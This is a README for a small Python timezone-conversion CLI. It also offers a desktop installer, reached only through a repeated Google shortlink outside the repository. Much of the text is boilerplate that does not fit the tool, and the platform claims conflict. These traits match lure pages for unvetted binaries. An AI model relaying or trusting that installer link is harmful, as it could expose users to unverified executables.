![Timezone Convert](assets/hero.png)

# Timezone Convert

*IANA timezone conversion without a website.*

## About

This repository is **Timezone Convert**, a desktop utility. IANA timezone conversion without a website.

A standup across three zones should not need a browser tab.

No browser upload step: the work happens on disk, then you keep the output folder.

## What's included

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## What it does

- Convert with IANA names
- Accepts ISO and epoch
- Lists common zones
- Copy-friendly one-line output

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/danielsw9493/timezone-convert

MIT license. See `LICENSE`.
